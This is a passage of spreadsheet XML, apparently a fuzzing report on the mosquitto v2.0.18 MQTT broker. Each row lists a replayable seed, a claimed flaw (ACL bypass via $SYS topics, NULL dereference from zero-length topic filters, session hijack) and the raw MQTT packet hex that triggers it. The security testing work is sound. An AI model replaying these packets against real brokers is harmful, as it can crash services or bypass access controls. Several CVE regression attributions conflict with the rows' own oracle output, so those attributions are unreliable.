          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B59" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C59" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(305B)\u000a4.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9" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c3 ===\u000a大小: 1363B (报告+请求数据)\u000a请求数据: 305B\u000a\u000a---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MQTT请求序列(305B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=30 Topics=[''(零长度!QoS=2)] | raw_header=822d001e000012686f6d652f2b2f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=88B | raw_header=3977001d245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE PacketID=1441 Topics=['$share/g3/èkmeK+/tem\x1c+share/'(QoS=3)] | raw_header=824005a1001c2473686172652f67332f\u000aMsg[4]: PUBREC PacketID=25857 | raw_header=512f6501002b766572792f646565702f\u000aMsg[5]: (不完整,22B) raw=011502e4e4900d000400008035fd35900d206d1ae000\u000a(尾部22B): 011502e4e4900d000400008035fd35900d206d1ae000</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A60" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B60" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C60" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(284B)\u000a4.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60" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 825B (报告+请求数据)\u000a请求数据: 284B\u000a\u000a---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MQTT请求序列(284B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=1)] | raw_header=82400001000005050bb51b0066757a7a\u000aMsg[2]: AUTH  | raw_header=f103cf6500\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['td\x90t\x00d'(QoS=3)] | raw_header=820b000100067464907400642f\u000aMsg[4]: PUBREL PacketID=41530 | raw_header=6505a23abc4d1f\u000aMsg[5]: PUBREL PacketID=30194 | raw_header=6f2f75f27ab7b36de4d0864d1f6f2f75\u000aMsg[6]: PUBREC PacketID=29743 | raw_header=5173742f63085f63336a747572650000\u000aMsg[7]: (不完整,27B) raw=d4ea8df80a6e1f0010617574685f696e5f70726f67726573732300\u000a(尾部27B): d4ea8df80a6e1f0010617574685f696e5f70726f67726573732300</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A61" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B61" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C61" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(349B)\u000a4.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1" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 2560B (报告+请求数据)\u000a请求数据: 349B\u000a\u000a---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MQTT请求序列(349B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10132f64206505a24cbc4d8266065d35\u000aMsg[2]: SUBSCRIBE PacketID=1441 Topics=['$sh\x1c$share/g3/home/+/\x06]5\x0b¸\x8dÊ'(QoS=2)] | raw_header=824005a1001c2473681c247368617265\u000aMsg[3]: PUBREL PacketID=24948 | raw_header=6572617475726502331c0009612f622f\u000aMsg[4]: TYPE0  | raw_header=05a1001c2473681c2473686172652f67\u000aMsg[5]: UNSUBSCRIBE  | raw_header=a100\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1c2473681c2473686172652f67332f68\u000aMsg[7]: PUBREL PacketID=25135 | raw_header=612f622f6b2f442f6505a23abc4d8200\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=820b000100006400006400ffff\u000aMsg[10]: (不完整,6B) raw=2f23fe2f0065\u000a(尾部6B): 2f23fe2f0065</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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2">
      <c r="A62" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B62" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C62" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(237B)\u000a4.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62" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 1284B (报告+请求数据)\u000a请求数据: 237B\u000a\u000a---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MQTT请求序列(237B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=66 Topics=[''(零长度!QoS=1), '$share/grp2/sensor/#'(QoS=2), 'home/+/temperature'(QoS=0)] | raw_header=8231004200000100142473686172652f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload='\x00Cë`cI·' | raw_header=341c0013245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['TT\x04\x02\x00&lt;'(QoS=0)] | raw_header=820b0001000654540402003c00\u000aMsg[4]: TYPE0  | raw_header=0766757a7a5f6333824005a1001c2473\u000aMsg[5]: SUBSCRIBE PacketID=1 Topics=['t\st/#'(QoS=2)] | raw_header=820b00010006745c73742f2302\u000aMsg[6]: PUBLISH Topic='test/c' QoS=2 retain=False payload='\x00\x14date' | raw_header=340e0006746573742f63001464617465\u000aMsg[7]: (不完整,10B) raw=62fa001480ffe0000000\u000a(尾部10B): 62fa001480ffe0000000</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A63" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:0345</t>
        </is>
      </c>
      <c r="B63" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C63" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(1178B)\u000a4.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Sev4\u000a- 违规类别代码: 0x0345\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E63" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0345 ===\u000a大小: 7308B (报告+请求数据)\u000a请求数据: 1178B\u000a\u000a---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MQTT请求序列(1178B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1329 Topics=[''(零长度!QoS=0)] | raw_header=87400531000064646464646464646464\u000aMsg[2]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[3]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[4]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[5]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[6]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[7]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[8]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[9]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[10]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[11]: TYPE0  | raw_header=0009612f622f402f642f65\u000aMsg[12]: TYPE0  | raw_header=0100\u000aMsg[13]: CONNACK session_present=101 reason_code=114 | raw_header=2b766572792f646565702f0080ffff63\u000aMsg[14]: TYPE0  | raw_header=0000\u000aMsg[15]: (不完整,59B) raw=2f646565702f00000080632f6c2f62612f622f402f642f6501002b766572792f646565702f22801d\u000a(尾部59B): 2f646565702f00000080632f6c2f62612f622f402f642f6501002b766572792f646565702f22801d6c332f6c652b2f646174</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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4">
      <c r="A64" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_1.tar.gz/replayable-violations/id:000009,sev:4,cat:03c5</t>
        </is>
      </c>
      <c r="B64" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C64" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(1279B)\u000a4.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0x03c5\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E64" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c5 ===\u000a大小: 4375B (报告+请求数据)\u000a请求数据: 1279B\u000a\u000a---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MQTT请求序列(1279B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1441 Topics=['$\x00\x00\x00ÿë\x00\x00\x00Þ\x00\x00\x00} ¡\x00\x1c$\x00\x00\x00\x80\x12"ÿþ$\x00\x00\x00\x80\x12"ÿd\x00\x00\x00\x80\x00\x00\x00\x00\x00k\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00ÿ\x00\x00\x00\x00Þ\x00'(QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=827f05a1004924000000ffeb000000de\u000aMsg[2]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[4]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b\u000aMsg[5]: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raw_header=3b3b3b3b3b3b3b3b3b3350021c39a534\u000aMsg[17]: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(不完整,50B) raw=3b3b3b3b3b3b3b3b3b0049004924000000ffeb000000de000000000100bf000000ffeb000000de00\u000a(尾部50B): 3b3b3b3b3b3b3b3b3b0049004924000000ffeb000000de000000000100bf000000ffeb000000de0000007d20a11f1c24002e</f>
        <v/>
      </c>
      <c r="F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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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5">
      <c r="A65" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000003,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B65" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C65" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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将种子文件(id:000003,sev:3,cat:0101)中的REQUEST DATA提取出来(100B)\u000a4.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5" s="2">
        <f>== 种子标识: id:000003,sev:3,cat:0101 ===\u000a大小: 627B (报告+请求数据)\u000a请求数据: 100B\u000a\u000a---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MQTT请求序列(100B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v64 ClientID=''(59B) clean_session=False keepalive=0s [持久会话] | raw_header=101300044d5154544000000000003b64\u000aMsg[2]: TYPE0  | raw_header=000a9374599b38be128e1905\u000aMsg[3]: (不完整,67B) raw=c14663732f637465013315001d1fcb021f9e9374599b38be128e1905c14663732f636f6e6e656374\u000a(尾部67B): c14663732f637465013315001d1fcb021f9e9374599b38be128e1905c14663732f636f6e6e6563746564001fcb021f9e9374</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J6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6">
      <c r="A66" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000005,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B66" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C66" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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将种子文件(id:000005,sev:3,cat:0101)中的REQUEST DATA提取出来(20B)\u000a4.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6" s="2">
        <f>== 种子标识: id:000005,sev:3,cat:0101 ===\u000a大小: 394B (报告+请求数据)\u000a请求数据: 20B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(20B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=12120000000000000000000000000000</f>
        <v/>
      </c>
      <c r="F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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J6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7">
      <c r="A67" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000005,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B67" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C67" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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7" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0040 ===\u000a大小: 436B (报告+请求数据)\u000a请求数据: 55B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(55B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=55245 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=8224d7cd00006400000080cdcd040000\u000aMsg[2]: (不完整,17B) raw=6d70260001740009612f622f632f642f65\u000a(尾部17B): 6d70260001740009612f622f632f642f65</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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8">
      <c r="A68" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000005,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B68" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C68" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(125B)\u000a4.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8" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:00c0 ===\u000a大小: 694B (报告+请求数据)\u000a请求数据: 125B\u000a\u000a---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MQTT请求序列(125B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1016 Topics=[''(零长度!QoS=3)] | raw_header=821d03f8000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$share/grp1/test/+' QoS=0 retain=True payload_len=71B | raw_header=395b00122473686172652f677270312f\u000aMsg[3]: PUBREL  | raw_header=64</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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9">
      <c r="A69" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000006,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B69" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C69" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(268B)\u000a4.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9" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0082 ===\u000a大小: 785B (报告+请求数据)\u000a请求数据: 268B\u000a\u000a---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MQTT请求序列(268B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=42 Topics=[] | raw_header=823f002a4d5154825e00af3426001c24\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=142473686172652f677270322f73656e\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=83B | raw_header=33680013245359532f62726f6b65722f\u000aMsg[4]: PUBREC PacketID=1536 | raw_header=540406003c00\u000aMsg[5]: (不完整,53B) raw=1d746573742d636c69656e742d776974682d7370656369616c2140232425000a77696c6c2f746f70\u000a(尾部53B): 1d746573742d636c69656e742d776974682d7370656369616c2140232425000a77696c6c2f746f706963000877696c6c5f6d</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A70" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000006,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B70" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C70" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(110B)\u000a4.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0" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0040 ===\u000a大小: 492B (报告+请求数据)\u000a请求数据: 110B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(110B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=10 Topics=[''(零长度!QoS=0)] | raw_header=820e000a000000ff0000e47f5454ff63\u000aMsg[2]: TYPE0  | raw_header=002982004062726f6b2f75796f656d42\u000aMsg[3]: (不完整,51B) raw=6b7b612f757974656d420210500001005173671b0166757ac000ac736551000966757a7a5f706173\u000a(尾部51B): 6b7b612f757974656d420210500001005173671b0166757ac000ac736551000966757a7a5f706173731c5836ffffffff3636</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J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1">
      <c r="A71" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B71" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C71" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(198B)\u000a4.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71" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 531B (报告+请求数据)\u000a请求数据: 198B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(198B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1710 Topics=[] | raw_header=823b06ae1d0be8d29e2126000a746573\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload_len=102B | raw_header=308501001d245359532f62726f6b6572\u000aMsg[3]: TYPE0  | raw_header=01</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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">
      <c r="A72" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B72" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C72" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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2" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 713B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MQTT请求序列(193B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1884 Topics=[] | raw_header=826f075c290ba48fa906260012247368\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=45B | raw_header=394c001d245359532f62726f6b65722f\u000aMsg[3]: PUBLISH  | raw_header=3080</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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3">
      <c r="A73" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B73" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C73" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D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73" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 407B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CONNECT Proto=\x17\x00\x11sensor/room1/Voo v109 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1317001317001173656e736f722f726f</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J7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4">
      <c r="A74" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B74" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C74" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(332B)\u000a4.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74" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0286 ===\u000a大小: 1015B (报告+请求数据)\u000a请求数据: 332B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: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MQTT请求序列(332B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30136d70003017001102003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['sensor/+/|emp'(QoS=0)] | raw_header=82120001000d73656e736f722f2b2f7c\u000aMsg[3]: PUBLISH Topic='sensor/ro@om1/tem' QoS=0 retain=False payload='p22.' | raw_header=3017001173656e736f722f726f406f6d\u000aMsg[4]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=353211000c636d642f6c696768824b00\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=142473686172652f677270322f73656e\u000aMsg[6]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=121B | raw_header=308e010013245359532f62726f6b6572\u000aMsg[7]: (不完整,31B) raw=742f6f6e00053162020005a2110002000000ff6ed06f722f2b2f74656d7000\u000a(尾部31B): 742f6f6e00053162020005a2110002000000ff6ed06f722f2b2f74656d7000</f>
        <v/>
      </c>
      <c r="F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" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J7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5">
      <c r="A75" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B75" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C75" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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5" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0040 ===\u000a大小: 399B (报告+请求数据)\u000a请求数据: 15B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(15B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=961 Topics=[''(零长度!QoS=2)] | raw_header=820c03c10000062b2f6461746128\u000aMsg[2]: PUBCOMP  | raw_header=7e</f>
        <v/>
      </c>
      <c r="F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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J7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6">
      <c r="A76" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B76" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C76" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D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DATA提取出来(145B)\u000a4.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6" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0042 ===\u000a大小: 676B (报告+请求数据)\u000a请求数据: 145B\u000a\u000a---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MQTT请求序列(145B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=239 Topics=[''(零长度!QoS=0)] | raw_header=822700ef0000142473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=80B | raw_header=3a650013245359532f62726f6b65722f\u000aMsg[3]: CONNACK  | raw_header=20</f>
        <v/>
      </c>
      <c r="F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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J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7">
      <c r="A77" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B77" s="2" t="inlineStr">
        <is>
